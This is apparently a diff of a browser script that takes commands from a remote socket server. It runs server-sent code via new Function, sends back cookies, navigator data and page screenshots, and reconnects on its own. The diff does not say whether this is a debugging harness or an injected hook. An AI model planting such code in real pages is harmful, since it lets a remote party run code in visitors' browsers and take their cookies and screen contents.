@@ -36,10 +36,18 @@
 
     socket.on("session", handleSessionEvent);
 
-    socket.on("disconnect", () => log("Disconnected from the server"));
+    socket.on("disconnect", handleDisconnectEvent);
 
     socket.on("message", handleMessageEvent);
     socket.on("command", handleCommandEvent);
+
+    function handleDisconnectEvent() {
+       log("Disconnected from the server");
+
+       state.reconnectInterval = setInterval(() => {
+        socket.connect();
+       }, 2500);
+    }
 
     function handleConnectEvent() {
       log("Connected to the server");
@@ -52,6 +60,7 @@
       } else {
         socket.emit("join", { sessionId: "new", scriptId: state.scriptId });
       }
+      clearInterval(state.reconnectInterval);
     }
 
     function handleSessionEvent(data) {
@@ -71,13 +80,14 @@
       switch (data.type) {
         case "execute":
           return executeCommand(data);
-        case "getInfo":
-          socket.emit("result", {
-            type: "getInfo-result",
-            payload: getUsefulInfo(),
-            commandId: data.commandId,
+        case "take-screenshoot":
+          return takeAScreenShoot(data).catch((err) => {
+            sendResponse("result", {
+              type: "execute-error",
+              payload: "ERROR: " + (err?.message ?? err),
+              commandId: data.commandId,
+            });
           });
-          return;
         default:
           log("Unknown command type", data.type);
           return;
@@ -87,7 +97,7 @@
     function executeCommand(data) {
       try {
         const func = new Function(
-          `return async function() {try {${data.payload}} catch(e) { return e?.message ?? e }}()`
+          `return async function() {try {${data.payload}} catch(e) { return "ERROR: "+ (e?.message ?? e) }}()`
         );
         func().then((result) => {
           sendResponse("result", {
@@ -100,10 +110,36 @@
       } catch (e) {
         sendResponse("result", {
           type: "execute-error",
-          payload: e.message,
+          payload: "ERROR: " + e.message,
           commandId: data.commandId,
         });
       }
+    }
+
+    async function takeAScreenShoot(socketData) {
+      if (!state.html2canvas) {
+        await new Promise((resolve, reject) => {
+          const src =
+            "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+          const script = document.createElement("script");
+          script.src = src;
+          script.onload = resolve;
+          script.onerror = reject;
+          setTimeout(reject, 25000, "Timeout fetching script");
+          document.head.appendChild(script);
+        });
+        state.html2canvas = true;
+      }
+
+      // @ts-ignore
+      html2canvas(document.body, { allowTaint: false }).then((canvas) => {
+        const data = canvas.toDataURL();
+        sendResponse("result", {
+          type: "screenshoot",
+          payload: data,
+          commandId: socketData.commandId,
+        });
+      });
     }
 
     function JSONReplaceFunctions(key, value) {
@@ -113,7 +149,8 @@
       return value;
     }
 
-    function getUsefulInfo() {
+    // @ts-ignore
+    window.getUsefulInfo = function () {
       const navigatorKeys = Object.keys(Object.getPrototypeOf(navigator));
       const navigatorValues = {};
       navigatorKeys.forEach((key) => {
@@ -171,7 +208,7 @@
         cookies: JSON.parse(JSON.stringify(cookies, JSONReplaceFunctions)),
         plugins: JSON.parse(JSON.stringify(plugins, JSONReplaceFunctions)),
       };
-    }
+    };
 
     function sendResponse(type, payload, ...rest) {
       socket.emit("result", { type, payload, ...rest, ...state });
